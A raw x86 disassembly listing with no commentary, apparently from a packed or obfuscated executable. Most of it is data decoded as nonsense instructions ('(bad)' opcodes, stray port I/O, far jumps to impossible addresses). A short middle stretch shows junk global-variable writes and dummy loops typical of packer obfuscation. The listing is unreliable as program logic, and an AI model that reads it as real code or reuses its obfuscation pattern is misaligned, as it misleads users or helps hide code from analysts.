  4137c8:	gs jmp 0x6077d32
  4137ce:	fwait
  4137cf:	mov    bl,0x7f
  4137d1:	imul   edi,DWORD PTR [esp+esi*4],0x3c8af486
  4137d8:	mov    al,0x89
  4137da:	rcl    ecx,1
  4137dc:	jns    0x41380c
  4137de:	pop    es
  4137df:	(bad)  
  4137e0:	mov    bl,BYTE PTR [edx+0x440d8107]
  4137e6:	lahf   
  4137e7:	sub    DWORD PTR [edi+edi*1+0x4ffadd71],esp
  4137ee:	sub    eax,0x2cb7f7b0
  4137f3:	jl     0x413861
  4137f5:	mov    al,0xe
  4137f7:	sbb    DWORD PTR [edx],esp
  4137f9:	xchg   dh,al
  4137fb:	in     eax,dx
  4137fc:	push   ebp
  4137fd:	jae    0x41378d
  4137ff:	mov    esp,0xec8a9d85
  413804:	dec    ebp
  413805:	sbb    eax,0xb9463a13
  41380a:	sbb    al,0xaf
  41380c:	dec    esp
  41380d:	leave  
  41380e:	pop    eax
  41380f:	cwde   
  413810:	pop    ds
  413811:	loopne 0x4137a7
  413813:	mov    WORD PTR [ebx-0x5ff53cce],es
  413819:	or     al,0x5d
  41381b:	inc    esi
  41381c:	aaa    
  41381d:	xchg   DWORD PTR [eax-0x1e],ebp
  413820:	in     eax,dx
  413821:	out    dx,eax
  413822:	or     esp,DWORD PTR es:[ebx]
  413825:	(bad)  
  413826:	hlt    
  413827:	nop
  413828:	(bad)
  41382b:	ret    
  41382c:	or     ebx,esp
  41382e:	adc    BYTE PTR [edi-0x53ec7855],bl
  413834:	mov    edx,edx
  413836:	xor    BYTE PTR [ecx],ch
  413838:	cmp    eax,0x91fe21d2
  41383d:	mov    ds:0x62b60690,eax
  413842:	lods   al,BYTE PTR ds:[esi]
  413843:	fs jb  0x413894
  413846:	sub    BYTE PTR [edi+0x170b3aee],al
  41384c:	and    esp,DWORD PTR [esi]
  41384e:	rcr    DWORD PTR [ecx+0x307a3e1d],1
  413854:	push   ebp
  413855:	jecxz  0x413898
  413857:	or     al,cl
  413859:	dec    edi
  41385a:	sbb    DWORD PTR [edx],ecx
  41385c:	xlat   BYTE PTR ds:[ebx]
  41385d:	ins    DWORD PTR es:[edi],dx
  41385e:	mov    esi,0x8f37f538
  413863:	inc    ecx
  413864:	jg     0x413808
  413866:	and    esp,esi
  413868:	xor    al,0xb9
  41386a:	xchg   ecx,esi
  41386c:	div    eax
  41386e:	out    0x52,eax
  413870:	in     eax,dx
  413871:	fwait
  413872:	stc    
  413873:	mov    ebx,0x67c585e5
  413878:	sti    
  413879:	add    ah,al
  41387b:	shl    DWORD PTR [edx-0x4533f3f],cl
  413881:	sub    al,0x93
  413883:	jne    0x413813
  413885:	sahf   
  413886:	nop
  413887:	(bad)  
  413889:	sub    BYTE PTR [eax-0x469234e4],al
  41388f:	shr    BYTE PTR [ecx-0x415f9fe9],cl
  413895:	out    dx,al
  413896:	repnz pop ss
  413898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413899:	ss cmp edi,eax
  41389c:	scas   al,BYTE PTR es:[edi]
  41389d:	mov    bh,0xb7
  4138a0:	out    0x38,eax
  4138a2:	mov    dl,0xb2
  4138a4:	rol    BYTE PTR [ecx-0x760fcb8f],0x2b
  4138ab:	sbb    eax,0xaa051a1a
  4138b0:	push   eax
  4138b1:	push   cs
  4138b2:	push   esi
  4138b3:	dec    ebp
  4138b4:	xchg   cx,ax
  4138b6:	xchg   DWORD PTR [esi-0x794f25e9],esi
  4138bc:	int    0xb2
  4138be:	or     eax,0x18f3493f
  4138c3:	scas   al,BYTE PTR es:[edi]
  4138c4:	sar    bh,0x56
  4138c7:	in     eax,0x85
  4138c9:	in     eax,dx
  4138ca:	and    bl,al
  4138cc:	xchg   ebx,eax
  4138cd:	mov    bh,0x22
  4138cf:	cmp    edi,DWORD PTR [ebp+0x4a012497]
  4138d5:	test   al,0x3b
  4138d7:	sbb    ah,dh
  4138d9:	mov    gs,WORD PTR [esi-0x4732383d]
  4138df:	xor    bl,BYTE PTR [edx]
  4138e1:	sbb    BYTE PTR [edx],dl
  4138e3:	pop    ds
  4138e4:	rcl    BYTE PTR [eax-0x5f4160bf],1
  4138ea:	les    ecx,FWORD PTR [ecx+0x56847a9]
  4138f0:	dec    esp
  4138f1:	mov    dh,0xf8
  4138f3:	and    BYTE PTR [edx],0x42
  4138f6:	stc    
  4138f7:	sub    BYTE PTR [ecx-0xeb25955],al
  4138fd:	sub    esi,DWORD PTR [ecx]
  4138ff:	xor    ch,BYTE PTR [edi-0x2a69a4dc]
  413905:	fisubr WORD PTR [edx+eax*4-0x1]
  413909:	adc    eax,DWORD PTR [esi]
  41390b:	mov    ecx,0x8dfd48e0
  413910:	and    BYTE PTR [eax+0x796e5e3c],cl
  413916:	mov    edi,0xe06f6c9d
  41391b:	adc    esi,DWORD PTR [eax]
  41391d:	mov    bh,0xb5
  41391f:	clc    
  413920:	jg     0x4138f5
  413922:	mov    esp,0xde53a1e9
  413927:	mov    ch,0xb
  413929:	mov    eax,0xa3db82a0
  41392e:	mov    ds:0x504727a0,al
  413933:	mov    eax,ds:0x9225829d
  413938:	in     al,dx
  413939:	adc    eax,0xefb78821
  41393e:	data16 add ah,al
  413941:	sti    
  413942:	loopne 0x4139bf
  413944:	popf   
  413945:	fld    TBYTE PTR [edi+0x77]
  413948:	ds stc 
  41394a:	out    0x5e,eax
  41394c:	push   ebx
  41394d:	push   edx
  41394e:	cmp    eax,0x35afa181
  413953:	xchg   edi,eax
  413954:	ds xchg esi,eax
  413956:	in     al,0x45
  413958:	daa    
  413959:	je     0x4139a1
  41395b:	mov    dl,BYTE PTR [ebx-0x12]
  41395e:	adc    eax,0x1c77787
  413963:	xchg   ebx,eax
  413964:	inc    esi
  413965:	sub    al,0x5e
  413967:	pushf  
  413968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413969:	popa   
  41396a:	sti    
  41396b:	cwde   
  41396c:	mov    al,ds:0x3e11b131
  413971:	(bad)  
  413972:	fadd   DWORD PTR [eax]
  413974:	dec    esi
  413975:	movd   mm3,DWORD PTR [ebx]
  413978:	call   0xb335d0cb
  41397d:	push   esi
  41397e:	add    DWORD PTR [ecx+eax*1],edi
  413981:	mov    ah,0x3b
  413983:	cli    
  413984:	cdq    
  413985:	xchg   esp,eax
  413986:	dec    ebp
  413987:	mov    ds:0x328a0f0e,al
  41398c:	dec    ebx
  41398d:	loopne 0x4139ab
  41398f:	xchg   ebp,eax
  413990:	pop    es
  413991:	xor    DWORD PTR [eax+0x23a40ba2],ebp
  413997:	and    edx,DWORD PTR ds:0x53a70095
  41399d:	cmp    eax,0x3c5e41e0
  4139a2:	iret   
  4139a3:	dec    esp
  4139a4:	jp     0x4139b2
  4139a6:	mov    al,ds:0x65e7d392
  4139ab:	in     al,dx
  4139ac:	add    ebx,edx
  4139ae:	test   BYTE PTR [edi+0x728859bc],bh
  4139b4:	pop    ebx
  4139b5:	out    dx,al
  4139b6:	and    esp,eax
  4139b8:	jmp    0x3512:0xe8852596
  4139bf:	mov    eax,ds:0x4c2cc05e
  4139c4:	test   BYTE PTR [edx-0x6d],0xa7
  4139c8:	inc    ebp
  4139c9:	cmp    esp,edx
  4139cb:	cmc    
  4139cc:	shl    DWORD PTR [ebx+0x5a24a0af],0xed
  4139d3:	or     al,0x7f
  4139d5:	cmp    al,dl
  4139d7:	ficom  DWORD PTR [edi-0x76]
  4139da:	mov    eax,0x2d623fa0
  4139df:	or     BYTE PTR [eax],0x70
  4139e2:	pop    eax
  4139e3:	jns    0x4139af
  4139e5:	dec    edx
  4139e6:	jge    0x4139fc
  4139e8:	aaa    
  4139e9:	push   cs
  4139ea:	into   
  4139eb:	out    dx,eax
  4139ec:	popa   
  4139ed:	mov    edx,0xbfef8962
  4139f2:	fdivr  DWORD PTR [ebp+0x4e]
  4139f5:	scas   eax,DWORD PTR es:[edi]
  4139f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f7:	leave  
  4139f8:	xor    ah,ch
  4139fa:	jge    0x975e2928
  413a00:	scas   eax,DWORD PTR es:[edi]
  413a01:	fnstcw WORD PTR [edx+esi*1]
  413a04:	mov    ecx,0xd558820f
  413a09:	inc    esp
  413a0a:	arpl   WORD PTR [ebx+0x7678579f],ax
  413a10:	inc    edx
  413a11:	fistp  QWORD PTR [ebx+0x7f]
  413a14:	mov    dh,0x7a
  413a16:	jo     0x4139dd
  413a18:	fwait
  413a19:	out    dx,eax
  413a1a:	loop   0x413a93
  413a1c:	and    ch,BYTE PTR fs:[edi]
  413a1f:	aad    0x3e
  413a21:	adc    ebx,ebx
  413a23:	cmp    al,0xc
  413a25:	ins    BYTE PTR es:[edi],dx
  413a26:	aam    0xa2
  413a28:	sbb    DWORD PTR [edi-0x7a2cc63a],edi
  413a2e:	call   0xbd8706f6
  413a33:	inc    esp
  413a34:	bound  ebx,QWORD PTR [esi+0x6114bc5b]
  413a3a:	hlt    
  413a3b:	outs   dx,DWORD PTR ds:[esi]
  413a3c:	leave  
  413a3d:	adc    esi,DWORD PTR [edx+ecx*2+0x5e091499]
  413a44:	sahf   
  413a45:	lods   al,BYTE PTR ds:[esi]
  413a46:	adc    al,0xd
  413a48:	inc    edx
  413a49:	loop   0x413a25
  413a4b:	push   edx
  413a4c:	(bad)
  413a50:	pushf  
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	xchg   esi,eax
  413a68:	jp     0x413a83
  413a6a:	mov    edx,0x7070687e
  413a6f:	mov    ecx,0x2d70707e
  413a74:	mov    DWORD PTR [edx],ebx
  413a76:	(bad)  
  413a77:	icebp  
  413a78:	into   
  413a79:	mov    bl,0xd7
  413a7b:	imul   ebx,ebp,0x36
  413a7e:	add    al,BYTE PTR [edx]
  413a80:	ins    BYTE PTR es:[edi],dx
  413a81:	out    0x16,al
  413a83:	in     eax,dx
  413a84:	sub    DWORD PTR [ebp+0x3d],esp
  413a87:	push   ebx
  413a88:	mov    ecx,0x5e1c1ac1
  413a8d:	out    0x63,eax
  413a8f:	retf   0xf1b0
  413a92:	mov    bh,BYTE PTR [edi+0x3b9fec7d]
  413a98:	mov    DWORD PTR [ebx],esi
  413a9a:	clc    
  413a9b:	dec    ebp
  413a9c:	sahf   
  413a9d:	xchg   esi,eax
  413a9e:	mov    edi,0xbf9f891e
  413aa3:	loopne 0x413acc
  413aa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aa6:	mov    ebp,DWORD PTR [edx]
  413aa8:	sub    dh,BYTE PTR ds:0x8b0d9b42
  413aae:	in     eax,dx
  413aaf:	push   ss
  413ab0:	pop    ds
  413ab1:	scas   eax,DWORD PTR es:[edi]
  413ab2:	push   ebp
  413ab3:	xchg   edi,eax
  413ab4:	retf   0x2517
  413ab7:	iret   
  413ab8:	inc    esp
  413ab9:	xor    al,0x35
  413abb:	adc    DWORD PTR [esi-0x6ba12053],0xffffffef
  413ac2:	(bad)  
  413ac3:	cmp    al,0x86
  413ac5:	je     0x413b25
  413ac7:	xchg   edi,eax
  413ac8:	stc    
  413ac9:	test   eax,0xb971fa73
  413ace:	dec    ecx
  413acf:	sub    al,0xdc
  413ad1:	pop    ss
  413ad2:	nop
  413ad3:	xchg   ebp,eax
  413ad4:	mov    al,0xb3
  413ad6:	sbb    esi,eax
  413ad8:	adc    al,0x3b
  413ada:	inc    esi
  413adb:	and    cl,BYTE PTR [ecx+0x4e]
  413ade:	in     al,dx
  413adf:	mov    ch,0xac
  413ae1:	mov    edi,0x39ca2077
  413ae6:	outs   dx,BYTE PTR ds:[esi]
  413ae7:	dec    edx
  413ae8:	in     eax,dx
  413ae9:	sub    DWORD PTR [ecx-0xd39821e],ebp
  413aef:	cmp    BYTE PTR [esi-0x34cbbf42],0x7c
  413af6:	xlat   BYTE PTR ds:[ebx]
  413af7:	fwait
  413af8:	cmp    eax,DWORD PTR [edx-0x47722e2]
  413afe:	inc    esi
  413aff:	mov    bh,0xf4
  413b01:	dec    ebx
  413b02:	jb     0x413acb
  413b04:	pop    edi
  413b05:	(bad)  
  413b07:	scas   al,BYTE PTR es:[edi]
  413b08:	cwde   
  413b09:	test   ecx,esp
  413b0b:	xor    DWORD PTR [esi+edx*2-0x7],eax
  413b0f:	adc    BYTE PTR [edi-0x2d],ah
  413b12:	pop    ds
  413b13:	call   0x9d1:0xf7ae7227
  413b1a:	enter  0x7fb2,0xa5
  413b1e:	mov    edi,0xb26da3ee
  413b23:	xchg   esp,eax
  413b24:	add    BYTE PTR [esi+0x3f],dl
  413b27:	cwde   
  413b28:	imul   edx,DWORD PTR [edi+eax*4+0x52e3a025],0x6a
  413b30:	add    eax,0x135579af
  413b35:	push   esi
  413b36:	mov    ecx,0x59ea00f7
  413b3b:	outs   dx,BYTE PTR ds:[esi]
  413b3c:	pop    di
  413b3e:	shl    DWORD PTR [ecx-0x4c],cl
  413b41:	sub    ecx,DWORD PTR [ecx+0x24]
  413b44:	std    
  413b45:	dec    ebp
  413b46:	sub    al,0xc0
  413b48:	xor    ecx,DWORD PTR [eax+0x3aa4a4d2]
  413b4e:	jmp    DWORD PTR ds:0x3992a15c
  413b54:	in     eax,dx
  413b55:	pop    edi
  413b56:	mov    cl,BYTE PTR [edx+ebx*4]
  413b59:	inc    edx
  413b5a:	aas    
  413b5b:	cmp    DWORD PTR [edx+0x7ba2cb61],eax
  413b61:	push   es
  413b62:	ja     0x413bdc
  413b64:	add    ch,BYTE PTR [edx-0x175a73c6]
  413b6a:	popf   
  413b6b:	push   edi
  413b6c:	enter  0x7244,0xec
  413b70:	push   edx
  413b71:	cmp    eax,0xb22d0ecc
  413b76:	popa   
  413b77:	jmp    0x413b7a
  413b79:	xchg   edx,eax
  413b7a:	add    bl,dh
  413b7c:	aad    0xbf
  413b7e:	xor    DWORD PTR [edx],esi
  413b80:	push   ecx
  413b81:	pop    es
  413b82:	lahf   
  413b83:	jo     0x413b60
  413b85:	xor    ah,ah
  413b87:	push   esp
  413b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b89:	xchg   ecx,eax
  413b8a:	push   0xffffff8a
  413b8c:	xchg   edi,eax
  413b8d:	imul   eax,DWORD PTR [ebp-0x1c],0x3f
  413b91:	push   edx
  413b92:	push   es
  413b93:	cbw    
  413b95:	aad    0xac
  413b97:	xchg   BYTE PTR [ebp-0x37],dl
  413b9a:	scas   eax,DWORD PTR es:[edi]
  413b9b:	or     DWORD PTR [ebx-0x66],ebx
  413b9e:	addr16 adc eax,0x23566481
  413ba4:	pop    edx
  413ba6:	in     eax,dx
  413ba7:	jb     0x413c01
  413ba9:	adc    bh,BYTE PTR [ecx-0x4c]
  413bac:	add    al,0xb5
  413bae:	es pop esp
  413bb0:	ja     0x413ba1
  413bb2:	mov    edx,0x578c614e
  413bb7:	arpl   WORD PTR [ebp+0x34],sp
  413bba:	pop    esp
  413bbb:	sbb    dl,ch
  413bbd:	sbb    eax,DWORD PTR [esi]
  413bbf:	les    ebx,FWORD PTR [ebx-0x4c]
  413bc2:	push   0xffffffab
  413bc4:	loop   0x413bdc
  413bc6:	mov    bh,0x91
  413bc8:	jmp    0xc860:0x5fa54e9d
  413bcf:	pop    esi
  413bd0:	and    bh,BYTE PTR [edx+ecx*8+0x11]
  413bd4:	test   DWORD PTR [ebp+0x3f],ecx
  413bd7:	hlt    
  413bd8:	cdq    
  413bd9:	dec    edx
  413bda:	lea    ebx,[ecx-0x1ddb5552]
  413be0:	dec    esp
  413be1:	scas   al,BYTE PTR es:[edi]
  413be2:	add    DWORD PTR [ebp-0x1260ea32],ebp
  413be8:	in     al,0xc0
  413bea:	xchg   ecx,eax
  413beb:	or     ah,dh
  413bed:	xchg   ecx,eax
  413bee:	fdivr  QWORD PTR [ebx]
  413bf0:	jno    0x413bab
  413bf2:	dec    ebp
  413bf3:	push   ds
  413bf4:	sbb    BYTE PTR [ebp-0x41],bl
  413bf7:	inc    eax
  413bf8:	push   ds
  413bf9:	dec    eax
  413bfa:	(bad)  
  413bfb:	fsubp  st(0),st
  413bfd:	es pushf 
  413bff:	mov    ebx,0xeeaf2d8
  413c04:	sbb    eax,0x153cb94c
  413c09:	and    BYTE PTR ds:0xe1d0f5fd,bh
  413c0f:	les    edx,FWORD PTR [esi+esi*2]
  413c12:	xchg   edi,edi
  413c14:	ja     0x413ba0
  413c16:	jp     0x413c64
  413c18:	mov    bh,0x33
  413c1a:	aam    0xe0
  413c1c:	test   BYTE PTR [ebx+0x19],bh
  413c1f:	aas    
  413c20:	std    
  413c21:	(bad)  
  413c22:	mov    edx,0xb6d96a35
  413c27:	jmp    0x413bb6
  413c29:	pop    ds
  413c2a:	test   al,0x59
  413c2d:	inc    esi
  413c2e:	adc    bh,bh
  413c30:	and    bh,bl
  413c32:	sbb    ax,0xe0f6
  413c36:	or     eax,0x5162c74e
  413c3b:	pop    ds
  413c3c:	ret    0xc4af
  413c3f:	jb     0x413c8e
  413c41:	sub    eax,0x650ccb25
  413c46:	in     eax,dx
  413c47:	dec    esp
  413c48:	call   0xb3863f55
  413c4d:	outs   dx,BYTE PTR ds:[esi]
  413c4e:	push   ss
  413c4f:	pusha  
  413c50:	outs   dx,DWORD PTR ds:[esi]
  413c51:	add    ah,BYTE PTR [eax]
  413c53:	scas   al,BYTE PTR es:[edi]
  413c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c55:	aas    
  413c56:	fld    QWORD PTR [edi-0x1871ef95]
  413c5c:	adc    DWORD PTR [edi+eiz*1-0x617287e7],ebx
  413c63:	ret    
  413c64:	adc    BYTE PTR [ebx-0xda65e60],ch
  413c6a:	out    dx,al
  413c6b:	ins    DWORD PTR es:[edi],dx
  413c6c:	cmp    DWORD PTR [eax+0x4da6c2d],edx
  413c72:	mov    edx,0xb7c95d9e
  413c77:	mov    BYTE PTR [edi],dl
  413c79:	retf   0x25bf
  413c7c:	mov    ds:0x73e36903,al
  413c81:	mov    bh,0xd4
  413c83:	mov    ch,0x54
  413c85:	shl    ebp,1
  413c87:	lds    ecx,FWORD PTR ds:[edi]
  413c8a:	enter  0x7461,0x12
  413c8e:	push   0x61e8c568
  413c93:	dec    ecx
  413c94:	mov    edx,DWORD PTR [esi+0x60c49d30]
  413c9a:	dec    eax
  413c9b:	jmp    0x413c79
  413c9d:	sbb    ebp,DWORD PTR [esi-0x28]
  413ca0:	pop    ebp
  413ca1:	call   0x7e0f:0x55b3c1e7
  413ca8:	mov    WORD PTR [esi],ds
  413caa:	test   bl,cl
  413cac:	jle    0x413c56
  413cae:	(bad)  
  413caf:	sbb    edi,esi
  413cb1:	xchg   DWORD PTR [ecx],ebx
  413cb3:	stos   DWORD PTR es:[edi],eax
  413cb4:	test   BYTE PTR [ecx+0x41],dh
  413cb7:	inc    edx
  413cb8:	leave  
  413cb9:	pop    ecx
  413cba:	mul    DWORD PTR [edi+edx*1+0xa414a1]
  413cc1:	imul   ebx,DWORD PTR [eax-0x61b19d04],0x1a50ad08
  413ccb:	inc    ebp
  413ccc:	push   ds
  413ccd:	test   bl,dl
  413ccf:	xchg   BYTE PTR [ebx-0x6e269ac6],al
  413cd5:	cmp    cl,BYTE PTR [edi]
  413cd7:	cmc    
  413cd8:	and    DWORD PTR [esi-0x3793a9af],eax
  413cde:	jo     0x413d17
  413ce0:	mov    ebp,0x5d0468d
  413ce5:	adc    eax,0x1fd17cda
  413cea:	fist   WORD PTR [esi-0x58446bfc]
  413cf1:	aad    0xeb
  413cf3:	push   0x3efc65c5
  413cf8:	adc    eax,0x17f5a5fe
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	cmp    eax,0xcd201c9
  413d03:	jl     0x413d3b
  413d05:	xlat   BYTE PTR ds:[ebx]
  413d06:	mov    ebp,0x95e82b7d
  413d0b:	loop   0x413d0d
  413d0d:	test   eax,0xa956e95b
  413d12:	arpl   si,dx
  413d14:	loop   0x413cfe
  413d16:	clc    
  413d17:	loop   0x413d95
  413d19:	xchg   DWORD PTR [ecx],eax
  413d1b:	or     ecx,eax
  413d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d1e:	arpl   WORD PTR [edx],di
  413d20:	jecxz  0x413d57
  413d22:	push   esi
  413d23:	and    eax,DWORD PTR [eax-0x21]
  413d26:	jnp    0x413d25
  413d28:	pop    ecx
  413d29:	and    DWORD PTR [esi-0x3c],edx
  413d2c:	xchg   esp,eax
  413d2d:	jnp    0x413d37
  413d2f:	push   0x20ca38eb
  413d34:	inc    eax
  413d35:	and    BYTE PTR [ecx+0x5],ch
  413d38:	ja     0x413ce9
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e77f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e77f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e77f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e5eb
  413d7f:	cmp    DWORD PTR ds:0x42e77f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e77f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e77f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e77f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e77f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e78f,0x42fe06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e1ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e777
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fd59,0x42e1a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e77b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e77b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e77b,eax
  413e08:	cmp    DWORD PTR ds:0x42e77b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e77b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e50b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e777,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e783
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e19c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e77b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)
  413e8e:	int    0x47
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e73
  413e98:	scas   al,BYTE PTR es:[edi]
  413e99:	mov    esp,esp
  413e9b:	dec    ebp
  413e9c:	sub    BYTE PTR [ecx+0x72],bh
  413e9f:	dec    esp
  413ea0:	push   ds
  413ea1:	mov    dl,0xd1
  413ea3:	cmp    BYTE PTR [esi+0x34d3d2ca],0x45
  413eaa:	add    cl,ch
  413eac:	xor    eax,0x83cbd6ec
  413eb1:	(bad)  
  413eb2:	jno    0x413efb
  413eb4:	inc    ebx
  413eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb6:	add    BYTE PTR [ebx],ah
  413eb8:	mov    bl,0xb2
  413eba:	mov    bl,0x7b
  413ebc:	lds    esi,FWORD PTR [ecx]
  413ebe:	add    DWORD PTR [edx+0x3a],eax
  413ec1:	sti    
  413ec2:	test   BYTE PTR [edx+0xaf8c378],bh
  413ec8:	es into 
  413eca:	add    al,0xcd
  413ecc:	cs stos DWORD PTR es:[edi],eax
  413ece:	ret    
  413ecf:	mov    edx,0xfabebbeb
  413ed4:	shr    BYTE PTR [ebx],cl
  413ed6:	mov    cl,0x8d
  413ed8:	push   0x8a078baa
  413edd:	enter  0xe89e,0x97
  413ee1:	add    eax,0xd03675a5
  413ee6:	das    
  413ee7:	jl     0x413e88
  413ee9:	dec    ebx
  413eea:	jb     0x413e89
  413eec:	cld    
  413eed:	das    
  413eee:	ja     0x413ede
  413ef0:	cs inc ebx
  413ef2:	(bad)  
  413ef3:	repnz xor dl,0x79
  413ef7:	pop    es
  413ef8:	pmaxub mm5,QWORD PTR [ecx-0x43c5ffb6]
  413eff:	scas   eax,DWORD PTR es:[edi]
  413f00:	or     bl,0x12
  413f03:	inc    esp
  413f04:	pop    edx
  413f05:	sub    eax,0xd725c9b2
  413f0a:	xchg   ebx,eax
  413f0b:	je     0x413f5d
  413f0d:	ret    
  413f0e:	cli    
  413f0f:	push   ecx
  413f10:	ins    BYTE PTR es:[edi],dx
  413f11:	ss pop ebx
  413f13:	jae    0x413f58
  413f15:	push   edi
  413f16:	cmc    
  413f17:	fst    DWORD PTR [ecx+0x32]
  413f1a:	mov    ch,0x7d
  413f1c:	test   DWORD PTR [eax],ebp
  413f1e:	fld    DWORD PTR [edx-0x31]
  413f21:	retf   0xbf4d
  413f24:	sub    BYTE PTR [ebx+0x3d],dl
  413f27:	aad    0x19
  413f29:	hlt    
  413f2a:	dec    esi
  413f2b:	std    
  413f2c:	fld    QWORD PTR ds:0x3bf66705
  413f32:	dec    esp
  413f33:	dec    esi
  413f34:	adc    ah,0xf9
  413f37:	js     0x413fb1
  413f39:	inc    esp
  413f3a:	bound  edi,QWORD PTR [ebx-0x5dd4a368]
  413f40:	ja     0x413efa
  413f42:	xor    BYTE PTR [ebp-0x73],0xaf
  413f46:	popa   
  413f47:	leave  
  413f48:	rcl    BYTE PTR [ecx+0x59],1
  413f4b:	sar    DWORD PTR [edi-0x44e51878],cl
  413f51:	mov    ch,0x5e
  413f53:	aas    
  413f54:	sbb    DWORD PTR [eax-0x78e26c0a],edi
  413f5a:	inc    edx
  413f5b:	(bad)  
  413f5d:	push   esp
  413f5e:	cmp    BYTE PTR [ebp-0x61],0xdc
  413f62:	jmp    0xcaf6:0x9839798d
  413f69:	inc    ebp
  413f6a:	nop
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	fwait
  413f6d:	leave  
  413f6e:	jbe    0x413f98
  413f70:	popfw  
  413f72:	icebp  
  413f73:	or     ah,dl
  413f75:	mov    ch,0xdf
  413f77:	sahf   
  413f78:	sub    DWORD PTR [ecx],esp
  413f7a:	ja     0x413f9f
  413f7c:	mov    dh,0xb8
  413f7e:	inc    esp
  413f7f:	sbb    BYTE PTR [esi+0x6e],0x9f
  413f83:	scas   al,BYTE PTR es:[edi]
  413f84:	imul   edi,DWORD PTR [ecx+0x78],0x934d2c1d
  413f8b:	pop    esp
  413f8c:	ss pop edx
  413f8e:	dec    ebx
  413f8f:	jg     0x413fc1
  413f91:	data16 mov ah,0xa2
  413f94:	in     al,dx
  413f95:	xor    DWORD PTR [ecx-0x55],ecx
  413f98:	addr16 ss enter 0x7ff6,0xc6
  413f9e:	fld    DWORD PTR [eax+esi*4-0x26]
  413fa2:	mov    dh,0xef
  413fa4:	sub    cl,BYTE PTR [ebx+eiz*8]
  413fa7:	adc    BYTE PTR [ebx-0x47520d88],ch
  413fad:	xchg   si,ax
  413faf:	cs sub eax,0x521b5e0b
  413fb5:	jnp    0x413fde
  413fb7:	aam    0x9b
  413fb9:	add    al,0x6d
  413fbb:	mov    cl,0x7a
  413fbd:	popa   
  413fbe:	loop   0x413fe5
  413fc0:	jmp    0x413fde
  413fc2:	adc    eax,DWORD PTR [edx]
  413fc4:	fdivr  QWORD PTR [edx]
  413fc6:	ret    0xef6
  413fc9:	xchg   esp,eax
  413fca:	push   0x969c0ce7
  413fcf:	cmc    
  413fd0:	xlat   BYTE PTR ds:[ebx]
  413fd1:	bound  esi,QWORD PTR [eax+0x1d3e1cfe]
  413fd7:	add    esi,DWORD PTR [ebx+0x485a4fb9]
  413fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fde:	fldcw  WORD PTR [ebx]
  413fe0:	dec    eax
  413fe1:	popf   
  413fe2:	xchg   ebx,eax
  413fe3:	fist   WORD PTR [eax+0x35a144d0]
  413fe9:	bound  ecx,QWORD PTR [ebx]
  413feb:	int3   
